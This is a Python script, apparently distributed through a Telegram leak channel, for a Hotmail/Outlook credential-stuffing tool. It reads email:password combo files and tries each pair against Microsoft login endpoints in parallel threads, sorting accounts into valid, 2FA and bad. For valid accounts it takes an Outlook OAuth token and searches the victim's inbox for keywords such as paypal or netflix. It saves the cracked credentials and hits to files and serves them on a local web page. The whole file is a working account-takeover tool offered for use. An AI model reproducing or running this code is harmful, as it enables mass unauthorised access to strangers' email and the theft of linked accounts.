# Hotmail Inboxer — Fixed Edition
# Credits: @Fatbusinessman | https://t.me/ChkLeak

import requests, re, concurrent.futures, time, threading, os, sys, json
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from colorama import init, Fore, Style
import urllib3, webbrowser
from http.server import HTTPServer, SimpleHTTPRequestHandler

urllib3.disable_warnings()
import warnings
warnings.filterwarnings("ignore")
init()

# ─── CONFIG ───
TG_USER = "@Fatbusinessman"
TG_CHAN = "https://t.me/ChkLeak"
CREDIT_LINE = f"{TG_USER} | {TG_CHAN}"

OUTLOOK_CLIENT_ID = "9199bf20-a13f-4107-85dc-02114787ef48"
OUTLOOK_REDIRECT = "https://outlook.live.com/mail/"
OUTLOOK_SCOPE = "https://outlook.office.com/.default openid profile offline_access"

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

valid = bad = twofa = checked = retries = 0
total = 0
inbox_hits = []
port = 8080
start_time = datetime.now()

# Keywords (set in ask_inboxer)
keywords = []


class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""<html><head><style>
                body{{background:#0a0a0a;color:#fff;font-family:Arial;padding:20px;}}
                .container{{max-width:600px;margin:0 auto;background:#1a1a1a;padding:30px;border-radius:15px;box-shadow:0 0 30px #00ff88;}}
                h1{{color:#00ff88;text-align:center;margin-bottom:30px;}}
                .stats{{display:grid;grid-template-columns:repeat(2,1fr);gap:15px;margin:20px 0;}}
                .stat{{background:#2a2a2a;padding:15px;border-radius:10px;text-align:center;border-left:4px solid;}}
                .valid{{border-color:#00ff88;}}
                .inbox{{border-color:#00aaff;}}
                .twofa{{border-color:#ffaa00;}}
                .bad{{border-color:#ff4444;}}
                .num{{font-size:28px;font-weight:bold;margin:5px 0;}}
                .download{{display:block;background:linear-gradient(45deg,#00ff88,#00aaff);color:#000;padding:15px;text-align:center;text-decoration:none;border-radius:8px;margin:10px 0;font-weight:bold;font-size:18px;transition:0.3s;}}
                .download:hover{{transform:translateY(-3px);box-shadow:0 5px 15px rgba(0,255,136,0.4);}}
            </style></head>
            <body><div class="container">
                <h1>🔥 {CREDIT_LINE} Results 🔥</h1>
                <div class="stats">
                    <div class="stat valid"><div>Valid</div><div class="num">{valid}</div></div>
                    <div class="stat inbox"><div>Inbox Hits</div><div class="num">{len(inbox_hits)}</div></div>
                    <div class="stat twofa"><div>2FA</div><div class="num">{twofa}</div></div>
                    <div class="stat bad"><div>Bad</div><div class="num">{bad}</div></div>
                </div>
                <a href="/valid.txt" class="download">✅ Download Valid.txt</a>
                <a href="/inbox_hits.txt" class="download">📬 Download Inbox_Hits.txt</a>
                <a href="/2fa.txt" class="download">🔐 Download 2FA.txt</a>
            </div></body></html>"""
            self.wfile.write(html.encode())
        elif self.path == '/valid.txt':
            self.send_file('valid.txt')
        elif self.path == '/inbox_hits.txt':
            self.send_file('Inbox_Hits.txt')
        elif self.path == '/2fa.txt':
            self.send_file('2fa.txt')

    def send_file(self, f):
        if os.path.exists(f):
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            with open(f, 'rb') as file:
                self.wfile.write(file.read())


def print_banner():
    print(f"""{Fore.CYAN}{Style.BRIGHT}
    ╔═══════════════════════════════════════════════════╗
    ║           HOTMAIL INBOXER — v2                   ║
    ║           {CREDIT_LINE}          ║
    ╚═══════════════════════════════════════════════════╝
    {Style.RESET_ALL}""")


def animated_bar(percent, width=40):
    filled = int(width * percent // 100)
    frames = ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃", "▂"]
    frame = frames[int(time.time() * 10) % len(frames)]
    bar = ""
    for i in range(width):
        if i < filled:
            bar += f"{Fore.GREEN}{Style.BRIGHT}█{Style.RESET_ALL}"
        elif i == filled:
            bar += f"{Fore.YELLOW}{Style.BRIGHT}{frame}{Style.RESET_ALL}"
        else:
            bar += f"{Fore.LIGHTBLACK_EX}░{Style.RESET_ALL}"
    return bar


def print_stats():
    percent = (checked / total * 100) if total > 0 else 0
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    bar = animated_bar(percent, 40)
    elapsed = datetime.now() - start_time
    elapsed_str = str(elapsed).split('.')[0]
    print(f"{Fore.CYAN}{Style.BRIGHT}┌─────────────────────────────────────────────────────┐")
    print(f"{Fore.CYAN}│{Style.BRIGHT} Progress: {bar} {percent:6.2f}% {Fore.CYAN}│")
    print(f"{Fore.CYAN}│{Fore.GREEN} ✓ Valid:      {Fore.WHITE}{valid:<8}{Fore.YELLOW} ⚠ 2FA:    {Fore.WHITE}{twofa:<8}{Fore.CYAN}│")
    print(f"{Fore.CYAN}│{Fore.MAGENTA} 📬 Inbox Hits: {Fore.WHITE}{len(inbox_hits):<7}{Fore.RED} ✗ Bad:     {Fore.WHITE}{bad:<8}{Fore.CYAN}│")
    print(f"{Fore.CYAN}│{Fore.CYAN} 📊 Checked:    {Fore.WHITE}{checked}/{total:<6}{Fore.CYAN}│")
    print(f"{Fore.CYAN}│{Fore.GREEN} ⏰ Time: {elapsed_str:<39}{Fore.CYAN}│")
    if keywords:
        print(f"{Fore.CYAN}│{Fore.MAGENTA} 🔍 Keywords: {', '.join(keywords):<36}{Fore.CYAN}│")
    print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘{Style.RESET_ALL}")


def get_login_data(session):
    global retries
    for _ in range(3):
        try:
            text = session.get(sFTTag_url, timeout=10, verify=False).text
            sFTTag = re.search(r'value=\\\"(.+?)\\\"', text, re.S).group(1)
            urlPost = re.search(r'"urlPost":"(.+?)"', text, re.S).group(1)
            return urlPost, sFTTag, session
        except:
            time.sleep(0.5)
    retries += 1
    return None, None, session


# ─── FIXED INBOXER ───
def search_emails_with_token(session, email, password, kws):
    """
    REAL inboxer: gets Outlook token and searches via outlook.office.com API.
    Returns (found_keywords, details) or ([], []).
    """
    try:
        # 1. Get PKCE
        import secrets, hashlib, base64
        v = secrets.token_urlsafe(32)
        ch = base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).rstrip(b"=").decode()

        # 2. Build Outlook OAuth URL
        qs = [
            f"client_id={OUTLOOK_CLIENT_ID}",
            f"scope={requests.utils.quote(OUTLOOK_SCOPE, safe='')}",
            f"redirect_uri={requests.utils.quote(OUTLOOK_REDIRECT, safe='')}",
            "response_type=code",
            "response_mode=fragment",
            f"code_challenge={ch}",
            "code_challenge_method=S256",
            "prompt=none",
        ]
        auth_url = "https://login.live.com/oauth20_authorize.srf?" + "&".join(qs)

        # 3. GET auth page
        r = session.get(auth_url, allow_redirects=True, timeout=15, verify=False)
        if r.status_code != 200:
            return [], []

        # 4. Extract PPFT and urlPost from the page
        ppft_m = re.search(r'"sFT"\s*:\s*"([^"]+)"', r.text)
        urlpost_m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', r.text)
        if not ppft_m or not urlpost_m:
            return [], []
        ppft = ppft_m.group(1)
        urlpost = urlpost_m.group(1).replace("\\u0026", "&").replace("\\/", "/")

        # 5. POST login to checkpassword.srf (modern MS endpoint)
        try:
            r2 = session.post(
                "https://login.live.com/checkpassword.srf",
                json={"username": email, "password": password, "checkpasswordflowtoken": ""},
                headers={
                    "accept": "application/json",
                    "content-type": "application/json; charset=utf-8",
                    "origin": "https://login.live.com",
                    "referer": auth_url,
                }, timeout=15, verify=False)
            j2 = r2.json()
            if (j2.get("validationresult") or "").lower() != "succeed":
                return [], []
        except Exception:
            # fallback to old flow
            pass

        # 6. Follow redirects to find code
        code = None
        cur = r
        for _ in range(8):
            loc = cur.headers.get("Location", "")
            if "code=" in loc:
                code = loc.split("code=")[1].split("&")[0]
                break
            if cur.status_code in (301, 302, 303, 307, 308) and loc:
                nxt = loc if loc.startswith("http") else "https://login.live.com" + loc
                cur = session.get(nxt, allow_redirects=False, timeout=15, verify=False)
            else:
                break

        if not code:
            return [], []

        # 7. Exchange code for token
        tb = {
            "client_id": OUTLOOK_CLIENT_ID,
            "redirect_uri": OUTLOOK_REDIRECT,
            "scope": OUTLOOK_SCOPE,
            "code": code,
            "grant_type": "authorization_code",
            "code_verifier": v,
        }
        r6 = session.post("https://login.live.com/oauth20_token.srf", data=tb,
                          headers={"content-type": "application/x-www-form-urlencoded"},
                          timeout=15, verify=False)
        if r6.status_code != 200:
            return [], []
        token = r6.json().get("access_token")
        if not token:
            return [], []

        # 8. Search emails via outlook.office.com API (the CORRECT endpoint for search)
        found = []
        details = []
        h = {"authorization": f"Bearer {token}", "accept": "application/json"}
        for kw in kws:
            try:
                sr = session.get(
                    "https://outlook.office.com/api/v2.0/me/messages",
                    params={"$search": f'"{kw}"', "$top": "10",
                            "$select": "Subject,From,ReceivedDateTime"},
                    headers=h, timeout=15, verify=False)
                if sr.status_code != 200:
                    continue
                items = sr.json().get("value", [])
                if items:
                    found.append(kw)
                    details.append({
                        "keyword": kw,
                        "count": len(items),
                        "subjects": [it.get("Subject", "")[:80] for it in items[:3]],
                    })
            except Exception:
                continue

        return found, details

    except Exception as e:
        print(f"{Fore.RED}[inboxer error] {e}{Style.RESET_ALL}")
        return [], []


def check_account(email, password):
    global valid, bad, twofa, checked, retries
    session = None
    try:
        session = requests.Session()
        session.verify = False
        urlPost, sFTTag, session = get_login_data(session)
        if not urlPost or not sFTTag:
            bad += 1; checked += 1
            return "BAD", f"{email}:{password}"

        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        req = session.post(urlPost, data=data,
                           headers={'Content-Type': 'application/x-www-form-urlencoded'},
                           allow_redirects=True, timeout=10, verify=False)

        if '#' in req.url and req.url != sFTTag_url:
            token = parse_qs(urlparse(req.url).fragment).get('access_token', ["None"])[0]
            if token != "None":
                valid += 1; checked += 1

                # ─── INBOXER: only if keywords set ───
                if keywords:
                    found, details = search_emails_with_token(
                        session, email, password, keywords)
                    if found:
                        inbox_hits.append({
                            'email': email, 'password': password,
                            'keywords': found, 'details': details,
                        })
                        with open("Inbox_Hits.txt", "a", encoding="utf-8") as f:
                            for d in details:
                                f.write(f"{email}:{password} | kw={d['keyword']} | "
                                        f"count={d['count']} | "
                                        f"sample={d['subjects'][0] if d['subjects'] else ''} | "
                                        f"{CREDIT_LINE}\n")
                        print(f"{Fore.MAGENTA}📬 Inbox Hit: {email}:{password} → "
                              f"{', '.join(found)}{Style.RESET_ALL}")

                return "VALID", f"{email}:{password}"

        if any(x in req.text for x in ["recover?mkt", "account.live.com/identity/confirm?mkt",
                                        "Email/Confirm?mkt", "/Abuse?mkt="]):
            twofa += 1; checked += 1
            return "2FA", f"{email}:{password}"

        if any(x in req.text.lower() for x in ["password is incorrect", "account doesn't exist",
                                               "sign in to your microsoft account",
                                               "tried to sign in too many times"]):
            bad += 1; checked += 1
            return "BAD", f"{email}:{password}"

        bad += 1; checked += 1
        return "BAD", f"{email}:{password}"
    except:
        retries += 1; bad += 1; checked += 1
        return "ERROR", f"{email}:{password}"
    finally:
        if session:
            try:
                session.close()
            except:
                pass


def worker(combo):
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email and password:
            result, account = check_account(email, password)
            if result == "VALID":
                with open("valid.txt", "a", encoding="utf-8") as f:
                    f.write(f"{account} | {CREDIT_LINE}\n")
            elif result == "2FA":
                with open("2fa.txt", "a", encoding="utf-8") as f:
                    f.write(f"{account} | {CREDIT_LINE}\n")
    except:
        pass


def update_stats():
    while True:
        print_stats()
        time.sleep(0.5)


def load_combos_from_file():
    print(f"\n{Fore.YELLOW}╔═══════════════════════════════════════════════╗")
    print(f"{Fore.YELLOW}║{Fore.CYAN}      LOAD COMBOS FROM FILE (email:pass)       {Fore.YELLOW}║")
    print(f"{Fore.YELLOW}╚═══════════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"{Fore.GREEN}▶{Fore.WHITE} Enter file path: {Style.RESET_ALL}", end="")
    file_path = input().strip().strip('"').strip("'")
    if not os.path.exists(file_path):
        print(f"{Fore.RED}✗ File not found.{Style.RESET_ALL}")
        return []
    combos = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                combos.append(line)
    print(f"{Fore.GREEN}✓ Loaded {len(combos)} combos from {file_path}{Style.RESET_ALL}")
    return combos


def ask_inboxer():
    global keywords
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║{Fore.MAGENTA}           INBOXER SETTINGS                    {Fore.CYAN}║")
    print(f"{Fore.CYAN}╚═══════════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}❓ Enable Inboxer (search emails for keywords)? (y/n): {Style.RESET_ALL}", end="")
    if input().lower() in ['y', 'yes']:
        print(f"\n{Fore.YELLOW}❓ Keywords (comma separated): {Style.RESET_ALL}", end="")
        kw = input().strip()
        if kw:
            keywords = [k.strip().lower() for k in kw.split(',') if k.strip()]
            print(f"{Fore.GREEN}✓ Will search: {', '.join(keywords)}{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}📧 Examples: netflix, spotify, paypal, steam, reset, steam{Style.RESET_ALL}")


def start_server():
    global port
    for p in range(8080, 8100):
        try:
            server = HTTPServer(('', p), Handler)
            port = p
            print(f"{Fore.GREEN}🌐 Server: http://localhost:{p}{Style.RESET_ALL}")
            server.serve_forever()
        except:
            continue


def main():
    global total, start_time
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()

    ask_inboxer()
    combos = load_combos_from_file()
    if not combos:
        print(f"{Fore.RED}No combos. Exiting.{Style.RESET_ALL}")
        return

    total = len(combos)
    print(f"\n{Fore.YELLOW}⚡ Threads [default 10]: {Style.RESET_ALL}", end="")
    try:
        threads = int(input())
    except:
        threads = 10

    open("valid.txt", "w", encoding="utf-8").close()
    open("Inbox_Hits.txt", "w", encoding="utf-8").close()
    open("2fa.txt", "w", encoding="utf-8").close()

    start_time = datetime.now()
    threading.Thread(target=update_stats, daemon=True).start()

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        ex.map(worker, combos)

    print(f"\n{Fore.GREEN}🌐 Starting server...{Style.RESET_ALL}")
    threading.Thread(target=start_server, daemon=True).start()
    time.sleep(1)
    webbrowser.open(f"http://localhost:{port}")

    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()

    elapsed = datetime.now() - start_time
    print(f"{Fore.CYAN}{Style.BRIGHT}┌─────────────────────────────────────────────────────┐")
    print(f"{Fore.CYAN}│{Fore.GREEN}{Style.BRIGHT}               CHECKING COMPLETE!                {Fore.CYAN}│")
    print(f"{Fore.CYAN}├─────────────────────────────────────────────────────┤")
    print(f"{Fore.CYAN}│{Fore.GREEN} ✓ Valid:      {valid:<10}{Fore.MAGENTA} 📬 Inbox Hits: {len(inbox_hits):<7}{Fore.CYAN}│")
    print(f"{Fore.CYAN}│{Fore.YELLOW} ⚠ 2FA:       {twofa:<10}{Fore.RED} ✗ Bad:      {bad:<10}{Fore.CYAN}│")
    print(f"{Fore.CYAN}│{Fore.CYAN} 📊 Total:     {total:<10}{Fore.BLUE} ⏰ Time:     {str(elapsed).split('.')[0]:<10}{Fore.CYAN}│")
    print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘{Style.RESET_ALL}")

    if inbox_hits:
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}🔍 INBOXER RESULTS:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓ {len(inbox_hits)} accounts with keywords{Style.RESET_ALL}")
        for hit in inbox_hits[:5]:
            print(f"  • {hit['email']}:{hit['password']}")
            print(f"    Keywords: {', '.join(hit['keywords'])}")
        if len(inbox_hits) > 5:
            print(f"  • ... and {len(inbox_hits) - 5} more")

    print(f"\n{Fore.GREEN}🌐 Server running: http://localhost:{port}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📱 Close window to stop server{Style.RESET_ALL}")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)